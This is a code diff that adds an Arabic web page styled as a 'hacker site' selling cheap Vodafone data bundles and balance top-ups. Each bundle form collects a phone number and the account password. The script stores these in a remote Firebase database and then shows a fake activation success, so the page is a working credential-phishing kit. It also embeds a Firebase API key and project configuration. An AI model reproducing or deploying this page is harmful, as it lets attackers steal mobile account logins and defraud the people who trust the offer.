@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>موقع هاكر - باقات Vodafone</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  body {
+    margin: 0;
+    background: black;
+    color: #0f0;
+    font-family: 'Share Tech Mono', monospace;
+    overflow-x: hidden;
+  }
+  canvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 0;
+  }
+  h1 {
+    text-align: center;
+    margin-top: 15px;
+    text-shadow: 0 0 5px #0f0;
+  }
+  .container {
+    position: relative;
+    z-index: 10;
+    max-width: 900px;
+    margin: 30px auto;
+    padding: 10px;
+  }
+  .package {
+    background: rgba(0, 50, 0, 0.7);
+    border: 2px solid #0f0;
+    border-radius: 8px;
+    padding: 15px;
+    margin-bottom: 25px;
+  }
+  .package h2 {
+    margin: 0 0 8px 0;
+    font-weight: bold;
+    text-shadow: 0 0 6px #0f0;
+  }
+  .package p {
+    margin: 5px 0;
+    font-size: 1.1em;
+  }
+  label {
+    display: block;
+    margin: 8px 0 3px;
+  }
+  input[type="text"], input[type="password"], input[type="number"] {
+    width: 100%;
+    padding: 6px;
+    border: 1px solid #0f0;
+    border-radius: 4px;
+    background: black;
+    color: #0f0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1em;
+  }
+  button {
+    margin-top: 12px;
+    background: #0f0;
+    color: black;
+    border: none;
+    padding: 10px 16px;
+    cursor: pointer;
+    font-weight: bold;
+    border-radius: 6px;
+    box-shadow: 0 0 10px #0f0;
+    transition: background 0.3s;
+  }
+  button:hover {
+    background: #0a0;
+  }
+  #balance-section {
+    background: rgba(0, 50, 0, 0.7);
+    border: 2px solid #0f0;
+    border-radius: 8px;
+    padding: 20px;
+    margin-top: 30px;
+  }
+  #result {
+    margin-top: 15px;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<h1>موقع هاكر - باقات Vodafone</h1>
+
+<div class="container">
+
+  <div class="package" id="pkg1">
+    <h2>باقه 42 ألف فليكس - 350 كاش</h2>
+    <p>شروط: الخط يكون نظام فليكس 260، ومفيش سلف أو نوتة</p>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone1" placeholder="أدخل رقم الهاتف" />
+    <label>كلمة المرور:</label>
+    <input type="password" id="pass1" placeholder="أدخل كلمة المرور" />
+    <button onclick="sendPackage('42 ألف فليكس - 350 كاش', 'phone1', 'pass1')">تفعيل الباقة</button>
+  </div>
+
+  <div class="package" id="pkg2">
+    <h2>باقه 13 ألف فليكس - 240 كاش</h2>
+    <p>شروط: مفيش سلف أو نوتة على الخط</p>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone2" placeholder="أدخل رقم الهاتف" />
+    <label>كلمة المرور:</label>
+    <input type="password" id="pass2" placeholder="أدخل كلمة المرور" />
+    <button onclick="sendPackage('13 ألف فليكس - 240 كاش', 'phone2', 'pass2')">تفعيل الباقة</button>
+  </div>
+
+  <div class="package" id="pkg3">
+    <h2>باقه 40 جيجا - 330 كاش</h2>
+    <p>بدون شروط</p>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone3" placeholder="أدخل رقم الهاتف" />
+    <label>كلمة المرور:</label>
+    <input type="password" id="pass3" placeholder="أدخل كلمة المرور" />
+    <button onclick="sendPackage('40 جيجا - 330 كاش', 'phone3', 'pass3')">تفعيل الباقة</button>
+  </div>
+
+  <div class="package" id="pkg4">
+    <h2>تجديد باقه 50 ألف فليكس - 8 أيام</h2>
+    <p>ملحوظة: تجديد فقط وليس تفعيل، يجب التجديد قبل انتهاء الباقة</p>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone4" placeholder="أدخل رقم الهاتف" />
+    <label>كلمة المرور:</label>
+    <input type="password" id="pass4" placeholder="أدخل كلمة المرور" />
+    <button onclick="sendPackage('تجديد باقه 50 ألف فليكس', 'phone4', 'pass4')">تفعيل الباقة</button>
+  </div>
+
+  <div class="package" id="pkg5">
+    <h2>باقه 5200 فليكس - 100 كاش</h2>
+    <p>شروط: مفيش سلف أو نوتة على الخط (مش متوفرة على طول)</p>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone5" placeholder="أدخل رقم الهاتف" />
+    <label>كلمة المرور:</label>
+    <input type="password" id="pass5" placeholder="أدخل كلمة المرور" />
+    <button onclick="sendPackage('5200 فليكس - 100 كاش', 'phone5', 'pass5')">تفعيل الباقة</button>
+  </div>
+
+  <div id="balance-section">
+    <h2>شحن رصيد صافي</h2>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="balancePhone" placeholder="أدخل رقم الهاتف" />
+    <label>الرصيد الصافي:</label>
+    <input type="number" id="balanceValue" placeholder="أدخل الرصيد الصافي" />
+    <p>السعر بالجنيه تلقائيًا: <span id="priceEGP">0</span> جنيه</p>
+    <button onclick="sendBalance()">شحن الرصيد</button>
+    <div id="result"></div>
+  </div>
+
+</div>
+
+<audio id="clickSound" src="https://actions.google.com/sounds/v1/ui/click.ogg" preload="auto"></audio>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+  // Initialize Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+    authDomain: "starkoscript.firebaseapp.com",
+    databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+    projectId: "starkoscript",
+    storageBucket: "starkoscript.appspot.com",
+    messagingSenderId: "381525854892",
+    appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Matrix effect
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  let width = window.innerWidth;
+  let height = window.innerHeight;
+  canvas.width = width;
+  canvas.height = height;
+
+  const letters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()*&^%';
+  const fontSize = 16;
+  const columns = Math.floor(width / fontSize);
+  const drops = [];
+  for (let i = 0; i < columns; i++) drops[i] = Math.random() * height;
+
+  function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, width, height);
+
+    ctx.fillStyle = '#0F0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, 35);
+
+  window.addEventListener('resize', () => {
+    width = window.innerWidth;
+    height = window.innerHeight;
+    canvas.width = width;
+    canvas.height = height;
+  });
+
+  // Sound effect
+  function playClick() {
+    const sound = document.getElementById('clickSound');
+    sound.currentTime = 0;
+    sound.play();
+  }
+
+  // Send package data to Firebase
+  function sendPackage(packageName, phoneId, passId) {
+    playClick();
+    const phone = document.getElementById(phoneId).value.trim();
+    const pass = document.getElementById(passId).value.trim();
+
+    if (!phone || !pass) {
+      alert('من فضلك أدخل رقم الهاتف وكلمة المرور');
+      return;
+    }
+
+    const data = {
+      service: packageName,
+      phone: phone,
+      password: pass,
+      timestamp: new Date().toISOString()
+    };
+
+    // Save to Firebase under 'requests'
+    const newRequestKey = db.ref().child('requests').push().key;
+    const updates = {};
+    updates['/requests/' + newRequestKey] = data;
+    db.ref().update(updates)
+      .then(() => {
+        alert('تم إرسال طلبك بنجاح!');
+        document.getElementById(phoneId).value = '';
+        document.getElementById(passId).value = '';
+      })
+      .catch(err => {
+        alert('حدث خطأ في الإرسال: ' + err.message);
+      });
+  }
+
+  // Handle balance input and calculation
+  const balanceInput = document.getElementById('balanceValue');
+  const priceDisplay = document.getElementById('priceEGP');
+  balanceInput.addEventListener('input', () => {
+    let val = parseFloat(balanceInput.value);
+    if (isNaN(val) || val < 0) val = 0;
+    priceDisplay.textContent = (val * 1.2).toFixed(2);
+  });
+
+  function sendBalance() {
+    playClick();
+    const phone = document.getElementById('balancePhone').value.trim();
+    const balance = parseFloat(document.getElementById('balanceValue').value);
+
+    if (!phone || isNaN(balance) || balance <= 0) {
+      alert('من فضلك أدخل رقم الهاتف والرصيد الصافي بشكل صحيح');
+      return;
+    }
+
+    const data = {
+      service: 'شحن رصيد صافي',
+      phone: phone,
+      balance: balance,
+      priceEGP: (balance * 1.2).toFixed(2),
+      timestamp: new Date().toISOString()
+    };
+
+    const newKey = db.ref().child('balance_requests').push().key;
+    const updates = {};
+    updates['/balance_requests/' + newKey] = data;
+    db.ref().update(updates)
+      .then(() => {
+        document.getElementById('result').textContent = 'تم شحن الرصيد بنجاح!';
+        document.getElementById('balancePhone').value = '';
+        document.getElementById('balanceValue').value = '';
+        priceDisplay.textContent = '0';
+      })
+      .catch(err => {
+        alert('حدث خطأ في الإرسال: ' + err.message);
+      });
+  }
+</script>
+
+</body>
+</html>
